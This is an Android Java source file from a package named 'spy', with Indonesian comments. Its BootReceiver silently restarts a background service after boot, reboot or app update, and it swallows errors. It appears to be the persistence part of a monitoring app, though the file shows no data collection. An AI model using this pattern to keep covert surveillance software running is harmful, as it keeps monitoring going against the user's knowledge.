package com.zaxz.spy;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Build;

/**
 * Auto-restart BackgroundService saat device selesai booting.
 *
 * Cara kerja:
 *  - Android trigger BOOT_COMPLETED action setelah user unlock pertama kali.
 *  - Kita start service foreground (Android O+ wajib startForegroundService
 *    kalau service-nya di-start dari background, dan service wajib panggil
 *    startForeground() dalam 5 detik — sudah dilakukan di onCreate BackgroundService).
 *  - MyPackageReplaced juga di-handle supaya setelah APK di-update, service
 *    otomatis restart tanpa user harus buka app.
 */
public class BootReceiver extends BroadcastReceiver {

    @Override
    public void onReceive(Context context, Intent intent) {
        if (intent == null || intent.getAction() == null) return;

        String action = intent.getAction();
        boolean shouldStart =
                Intent.ACTION_BOOT_COMPLETED.equals(action) ||
                "android.intent.action.QUICKBOOT_POWERON".equals(action) ||
                "com.htc.intent.action.QUICKBOOT_POWERON".equals(action) ||
                Intent.ACTION_MY_PACKAGE_REPLACED.equals(action) ||
                "android.intent.action.REBOOT".equals(action);

        if (!shouldStart) return;

        try {
            Intent serviceIntent = new Intent(context, BackgroundService.class);
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                context.startForegroundService(serviceIntent);
            } else {
                context.startService(serviceIntent);
            }
        } catch (Exception ignored) {
            // Pada beberapa OEM (Xiaomi, Huawei) startForegroundService dari
            // background setelah boot bisa gagal karena battery optimization.
            // Service akan restart sendiri lewat START_STICKY + JobScheduler.
        }
    }
}
